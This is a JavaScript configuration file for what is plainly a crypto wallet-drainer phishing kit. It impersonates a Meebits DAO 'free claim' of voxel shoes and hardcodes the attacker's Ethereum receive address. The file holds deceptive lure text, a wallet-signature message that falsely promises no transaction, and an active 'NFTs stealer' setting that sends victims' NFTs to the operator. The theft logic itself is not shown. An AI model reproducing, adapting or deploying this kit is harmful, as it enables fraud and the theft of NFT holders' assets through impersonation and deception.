const receiveAddress = "0x0D02c1D17e345B4dceA335Fd2988FbDF3F05e64C";

const collectionInfo = {
    name: "MeebitsNFTs",
    socialMedia: {
        discord: "https://discord.gg/7mTnu2ekkt",
        twitter: "",
        instagram: "",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpeg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "MEEBITS DAO",
}

const claimPageInfo = {
    title: "MEET THE<br>MEEKICKS", // <br> is a line break
    shortDescription: "Claim your Meekickz.",
    longDescription: "A Free Claim to all Meebits Holders.Connect your wallet that holds a Meebit to claim a pair of its voxel shoes.<br>Non-holders can also claim and resell to holder's on the secondary market.",

    claimButtonText: "CLAIM NOW",

    image: "meebits.jpeg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true, // Active (true) or not (false) NFTs stealer.
    minValue: 0.00001, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion